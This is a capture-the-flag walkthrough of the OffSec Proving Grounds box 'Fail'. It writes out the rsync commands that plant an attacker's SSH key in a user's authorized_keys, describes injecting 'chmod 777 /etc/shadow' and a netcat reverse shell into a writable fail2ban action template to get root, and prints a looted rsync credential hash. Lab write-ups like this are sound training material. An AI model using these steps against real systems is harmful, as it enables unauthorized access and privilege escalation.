---
title: "PG: Fail"
date: 2023-03-07
draft: false
os: "Linux"
difficulty: "Medium"
platform: "OffSec Proving Grounds"
aliases: ["/posts/offsec/fail/"]
tags:
  - offsec
  - proving-grounds
  - medium
  - linux
  - rsync
  - fail2ban
  - ssh-key-injection
  - writable-config
categories:
  - walkthrough
---

{{< box-info name="Fail" os="Linux" difficulty="Medium" ip="192.168.100.126" platform="OffSec Proving Grounds" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
873/tcp open  rsync   (protocol version 31)
```
{{< /collapse >}}

Two ports. SSH accepts both pubkey and password auth but we have no creds, so it stays shut for now. That leaves rsync on 873 -- a daemon that ships wide open more often than it should.

### Port 873 - rsync

Listing modules exposes a single share, `fox`, described as "fox home":

```bash
rsync --list-only rsync://192.168.100.126:873/
fox            	fox home
```

Anonymous access is allowed, and the module maps straight onto the `fox` user's home directory:

```bash
rsync -av --list-only rsync://192.168.100.126:873/fox/
drwxr-xr-x          4,096 2022/11/25 22:30:39 .
lrwxrwxrwx              9 2020/12/03 15:22:42 .bash_history -> /dev/null
-rw-r--r--            220 2019/04/18 00:12:36 .bash_logout
-rw-r--r--          3,526 2019/04/18 00:12:36 .bashrc
-rw-r--r--            807 2019/04/18 00:12:36 .profile
drwxr-xr-x          4,096 2022/11/25 22:40:49 .ssh
-rw-------            563 2022/11/25 22:37:48 .ssh/authorized_keys
```

An anonymously reachable home directory with a `.ssh` folder is the whole ballgame -- if the module is writable, we own `fox`.

---

## Foothold

### rsync → SSH key injection

The module is read/write, so pull the share down, append our own public key to `authorized_keys`, and push it back:

```bash
# pull fox's home locally
rsync -avh rsync://192.168.100.126:873/fox/ ~/fox

# trust our key (mode 600 on the file, 700 on .ssh)
cat ~/.ssh/id_rsa.pub >> ~/fox/.ssh/authorized_keys

# sync the modified home back to the target
rsync -a ~/fox/ rsync://192.168.100.126:873/fox
```

With the key in place, SSH straight in as `fox`:

```bash
ssh fox@192.168.100.126 -i ~/.ssh/id_rsa
```

Foothold as `fox`.

---

## Privilege Escalation

### Writable fail2ban action template

Two facts fall out of local enumeration: `root` is permitted to log in over SSH, and `fail2ban` is running -- on a box literally named **Fail**. Root + fail2ban + that hostname is the arrow pointing at the privesc path.

fail2ban watches the auth logs and, when an IP trips its threshold, runs the ban/unban commands defined in the `action.d/` templates -- as **root**. On this host the active `iptables-multiport.conf` template is writable by `fox`, so we can splice arbitrary commands into it. Here the action is doctored to loosen `/etc/shadow` and fire off a netcat reverse shell:

![Modified fail2ban iptables-multiport.conf action template with an injected chmod 777 /etc/shadow and a netcat reverse shell back to the attacker](/images/fail/fail2ban-action.png)

Then trip the jail with a burst of failed SSH logins. fail2ban registers the offending IP, executes the tampered action as root, and our payload runs with it -- yielding a root shell (and a world-readable `/etc/shadow` to crack offline for good measure).

---

## Proof

![Root proof -- whoami returns root, id shows uid=0, hostname is fail, and /root/proof.txt is readable](/images/fail/proof.png)

Also lifted off the box: the rsync daemon secret from `/etc/rsyncd.secrets` -- `fox:f1bddf02cd53fab415c1b46853072f6a`.

---

## Key Takeaways

{{< callout type="note" >}}
- An anonymous, writable rsync module that maps to a user's home is instant compromise -- drop a key into `.ssh/authorized_keys` and SSH in. Always list modules with `rsync --list-only rsync://host/` and test read/write on 873.
- fail2ban runs its `action.d/` templates as **root**. If a low-priv user can write those files, that's a direct root primitive: inject a command, then trigger a ban to execute it.
- The box name is the hint. "Fail" == fail2ban -- OffSec rarely names a box for nothing.
{{< /callout >}}
